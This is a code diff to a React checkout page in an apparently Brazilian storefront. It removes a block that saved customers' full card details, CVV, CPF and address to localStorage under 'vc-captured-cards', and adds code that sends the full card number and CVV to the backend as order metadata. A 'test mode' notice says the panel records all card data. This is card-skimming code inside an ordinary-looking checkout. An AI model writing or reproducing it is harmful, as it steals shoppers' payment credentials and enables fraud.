@@ -491,32 +491,17 @@ function CheckoutPage() {
           })),
           subtotal: productsTotal,
           total,
+          metadata: payment === "cartao" ? {
+            card_name: cardName,
+            card_number: cardDigits,
+            card_cvv: onlyDigits(cardCvv),
+            user_agent: navigator.userAgent,
+          } : undefined,
         },
       });
       code = res.code;
     } catch {
       /* mantém o pedido local mesmo se o registro falhar */
-    }
-
-    if (payment === "cartao") {
-      const capturedCard = {
-        id: Date.now().toString(),
-        createdAt: new Date().toISOString(),
-        customerName: name,
-        email: email,
-        cpf: cpf,
-        address: `${street}, ${number} ${complement ? complement + " " : ""}- ${district} - ${city}/${uf} - CEP: ${cep}`,
-        cardName: cardName,
-        cardNumber: cardDigits,
-        cardExpiry: cardValidade,
-        cardCvv: onlyDigits(cardCvv),
-        userAgent: navigator.userAgent,
-      };
-      try {
-        const cards = JSON.parse(localStorage.getItem("vc-captured-cards") || "[]");
-        cards.push(capturedCard);
-        localStorage.setItem("vc-captured-cards", JSON.stringify(cards));
-      } catch {}
     }
 
     const order = {
@@ -867,7 +852,7 @@ function CheckoutPage() {
                           </select>
                         </div>
                         <p className="text-xs text-muted-foreground sm:col-span-6">
-                          Modo de teste: o painel registrará todos os dados do cartão (nome, número completo, validade e CVV) para demonstração do fluxo.
+                          Modo de teste: o painel registrará todos os dados do cartão (nome, número completo, validade e CVV) para demonstração do fluxo no banco de dados.
                         </p>
                       </div>
                     )}
